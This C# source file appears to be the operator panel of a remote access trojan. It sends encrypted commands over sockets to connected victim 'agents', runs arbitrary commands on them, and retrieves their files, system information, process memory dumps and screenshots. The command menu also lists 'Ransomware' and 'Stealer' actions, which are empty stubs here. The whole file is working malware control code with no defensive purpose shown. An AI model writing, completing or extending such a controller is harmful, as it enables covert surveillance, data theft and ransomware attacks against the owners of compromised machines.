using Server_side.UserControls;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Server_side
{
    public partial class ClientInfo : Form
    {
        private Dictionary<Socket, String> client;
        private Socket clientSocket;
        private string passPhrase;
        private Encryptor encryptor;

        public ClientInfo(string clientIP, string clientHostname, string connectTime, string clientOS)
        {
            InitializeComponent();
            ipLabel.Text = clientIP;
            hostnameLabel.Text = clientHostname;
            contimeLabel.Text = connectTime;
            osLabel.Text = clientOS;

            client = NetworkLayer.clientList.SelectMany(dict => dict)
                .Where(kvp => kvp.Key.RemoteEndPoint.ToString().Contains(clientIP))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            clientSocket = client.Keys.First();
            passPhrase = client.Values.First();

            InitializeSavedValues(clientIP);
            agentLogBox.TextChanged += agentLogBox_TextChanged;

            cmdComboBox.Items.Clear();
            cmdComboBox.Items.Add("Get File");
            cmdComboBox.Items.Add("Get SystemInfo");
            cmdComboBox.Items.Add("Get ProcessDump");
            cmdComboBox.Items.Add("Get Screenshot");
            cmdComboBox.Items.Add("Ransomware");
            cmdComboBox.Items.Add("Stealer");
            cmdComboBox.Items.Add("Exit");
            cmdComboBox.SelectedIndex = 0;

            encryptor = new(passPhrase.Trim());
        }

        // Keeping agent log in the settings
        private void InitializeSavedValues(string clientIP)
        {
            string uid = $"{clientIP}_{passPhrase}";

            try
            {
                if (!Program.mySettings.Properties.Cast<System.Configuration.SettingsProperty>().Any(prop => prop.Name == uid))
                {
                    var newProperty = new System.Configuration.SettingsProperty(uid)
                    {
                        DefaultValue = string.Empty
                    };
                    Program.mySettings.Properties.Add(newProperty);
                    Program.mySettings.Save();
                }

                agentLogBox.Text = Program.mySettings.Properties[uid].DefaultValue.ToString();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error in InitializeSavedValues: " + e.Message);
            }
        }


        private void agentLogBox_TextChanged(object sender, EventArgs e)
        {
            Program.mySettings.Properties[$"{ipLabel.Text}_{passPhrase}"].DefaultValue = agentLogBox.Text;
            Program.mySettings.Save();
        }

        private void sendCommandBtn_Click(object sender, EventArgs e)
        {
            string delimiter = "|;|";
            string command = $"1{delimiter}{commandBox.Text}";

            keyLabel.Text = encryptor.GetKey();
            ivLabel.Text = encryptor.GetIV();
            passLabel.Text = passPhrase;

            byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
            NetworkLayer.Send(clientSocket, encryptedCommand);

            logging("Command sent|---|" + commandBox.Text);

            // Receive response
            byte[] response = NetworkLayer.ReceiveResult(clientSocket);
            string decryptedResponse = encryptor.Decrypt(response);
            logging("Response received|---|" + decryptedResponse);

            commandBox.Text = "";
        }

        private void logging(string log)
        {
            string[] parts = log.Split("|---|");
            string boldText = $"{parts[0]}: ";
            // Set bold text to blue color
            agentLogBox.SelectionStart = agentLogBox.TextLength;
            agentLogBox.SelectionLength = boldText.Length;
            agentLogBox.SelectionColor = Color.Blue;
            agentLogBox.SelectionFont = new Font(agentLogBox.Font, FontStyle.Bold);
            agentLogBox.AppendText(boldText);
            // Set the rest of the text to black color
            agentLogBox.SelectionStart = agentLogBox.TextLength;
            agentLogBox.SelectionLength = log.Length - boldText.Length;
            agentLogBox.SelectionColor = Color.Black;

            if (boldText.Contains("received"))
            {
                agentLogBox.AppendText(Environment.NewLine);
            }

            agentLogBox.AppendText(parts[1] + Environment.NewLine);
        }

        private void sendCommandBtn1_Click(object sender, EventArgs e)
        {
            string delimiter = "|;|";
            string placeholder = "";
            switch (cmdComboBox.SelectedIndex)
            {
                case 0:
                    {
                        placeholder = agentfileBox.Text;
                        if (string.IsNullOrEmpty(placeholder))
                        {
                            MessageBox.Show("Please enter a file path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        try
                        {
                            byte[] file = GetResultFile(true);
                            MessageBox.Show("File received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        catch (Exception ex)
                        {
                            logging("Error when receiving the file|---|" + ex.Message);
                            MessageBox.Show("Error when receiving the file: " + ex.Message);
                        }
                        break;
                    }
                case 1:
                    {
                        placeholder = "getsysteminfo";

                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        byte[] response = GetResultFile(false);
                        logging("Response received|---|" + Encoding.UTF8.GetString(response));


                        break;
                    }
                case 2:
                    {
                        placeholder = pidBox.Text;
                        if (string.IsNullOrEmpty(placeholder))
                        {
                            MessageBox.Show("Please enter a PID.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            return;
                        }
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        try
                        {
                            byte[] dump = GetResultFile(true);
                            MessageBox.Show("Process dump received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        catch (Exception ex)
                        {
                            logging("Error when receiving the process dump|---|" + ex.Message);
                            MessageBox.Show("Error when receiving the process dump: " + ex.Message);
                        }
                        break;
                    }
                case 3:
                    {
                        placeholder = "getscreenshot";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        try
                        {
                            byte[] image = GetResultFile(false);
                            MessageBox.Show("Screenshot received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            if (image != null && image.Length > 0)
                            {
                                using (MemoryStream ms = new MemoryStream(image))
                                {
                                    Image img = Image.FromStream(ms);
                                    DisplayScreenshot displayScreenshot = new DisplayScreenshot(img);
                                    displayScreenshot.Show();
                                }
                            }
                            else
                            {
                                logging("Error when receiving the screenshot.");
                            }
                        }
                        catch (Exception ex)
                        {
                            logging("Error displaying image: " + ex.Message);
                            MessageBox.Show("Error displaying image: " + ex.Message);
                        }
                        break;
                    }
                case 4:
                    {
                        break;
                    }
                case 5:
                    {
                        break;
                    }
                case 6:
                    {
                        placeholder = "exit";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent|---|" + cmdComboBox.Text);

                        // Receive response
                        byte[] response = NetworkLayer.ReceiveResult(clientSocket);
                        string decryptedResponse = encryptor.Decrypt(response);
                        logging("Response received|---|" + decryptedResponse);

                        MessageBox.Show("Client will be disconnected.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        this.Close();
                        break;
                    }
            }
        }

        private byte[]? GetResultFile(bool saved)
        {
            string delimiter = "|;|";
            byte[] received = NetworkLayer.ReceiveResult(clientSocket);
            string decrypted = encryptor.Decrypt(received);
            string[] parts = decrypted.Split(delimiter);

            string guid = parts[0];
            int chunkCount = int.Parse(parts[1]);
            string fileName = parts[2];

            logging($"File received|---|{fileName}_{guid}_{chunkCount}");

            string fileBase64 = "";
            for (int i = 0; i < chunkCount; i++)
            {
                byte[] chunk = NetworkLayer.ReceiveResult(clientSocket);
                string chunkDecrypted = encryptor.Decrypt(chunk);
                string[] chunkParts = chunkDecrypted.Split(delimiter);
                string chunkGuid = chunkParts[0];
                if (chunkGuid != guid)
                {
                    MessageBox.Show("Error in GetResultFile: GUID mismatch");
                    return null;
                }
                string chunkData = chunkParts[1];
                fileBase64 += chunkData;
            }

            byte[] fileData = Encryptor.InvertStr(fileBase64);

            if (saved)
            {
                // Get file name instead of the full path
                fileName = Path.GetFileName(fileName);
                string filePath = Path.Combine(Program.myConfigs.AppSettings.Settings["DownloadFolder"].Value, fileName);
                File.WriteAllBytes(filePath, fileData);
                MessageBox.Show($"File saved to {filePath}", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }

            return fileData;
        }

        private void clearLogBtn_Click(object sender, EventArgs e)
        {
            agentLogBox.Clear();
        }
    }

}
